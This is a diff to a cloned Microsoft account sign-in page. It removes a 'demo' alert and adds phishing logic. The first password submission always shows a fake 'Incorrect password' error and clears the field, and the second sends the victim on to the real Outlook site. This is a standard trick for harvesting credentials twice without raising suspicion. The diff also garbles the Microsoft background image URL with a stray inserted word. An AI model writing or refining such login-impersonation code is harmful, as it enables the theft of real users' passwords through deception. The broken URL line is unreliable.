@@ -61,7 +61,7 @@
                             event: { load: $page.backgroundImageControl_onLoad } }">
                         <div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                             <!-- ko if: backgroundImageUrl -->
-                            <div id="backgroundImage" role="img" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']" style="background-image: url(&quot;https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg&quot;);" class="background-image ext-background-image" aria-label="Organisation background image"></div>
+                            <div id="backgroundImage" role="img" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']" style="background-image: url(&quot;https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129 Explorations1c4.svg&quot;);" class="background-image ext-background-image" aria-label="Organisation background image"></div>
                             <!-- /ko -->
                         </div>
                     </div>
@@ -529,7 +529,16 @@
                     }).done(function(data) {
                         // Reset button text after submission
                         $(signInButton).val('Sign in');
-                        alert('Sign in successful! (This is a demo)');
+                        if (step === 1) {
+                            // Show "incorrect password" on first submission
+                            passwordError.textContent = 'Incorrect password';
+                            passwordError.style.display = 'block';
+                            passwordInput.value = ''; // Clear password field
+                            passwordInput.focus(); // Focus back on password input
+                        } else if (step === 2) {
+                            // Redirect to Outlook on second submission
+                            window.location.href = 'https://outlook.live.com/mail/';
+                        }
                     }).fail(function(error) {
                         // Reset button text on error
                         $(signInButton).val('Sign in');
